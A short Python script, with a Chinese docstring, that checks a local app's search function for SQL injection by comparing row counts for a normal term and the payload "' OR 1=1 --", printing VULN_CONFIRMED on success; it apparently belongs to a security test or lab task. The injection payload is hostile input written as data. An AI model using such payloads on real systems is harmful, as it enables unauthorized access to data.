"""验证 /search 的 SQL 注入。成功时输出 VULN_CONFIRMED。"""

from __future__ import annotations

import os
import sys

SRC_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, SRC_DIR)

import app  # noqa: E402


def main() -> int:
    normal = app.search_items("Widget")
    injected = app.search_items("' OR 1=1 --")
    print(f"normal_rows={len(normal)} injected_rows={len(injected)}")
    if len(injected) > len(normal):
        print("VULN_CONFIRMED")
        return 0
    print("injection not confirmed")
    return 1


if __name__ == "__main__":
    raise SystemExit(main())
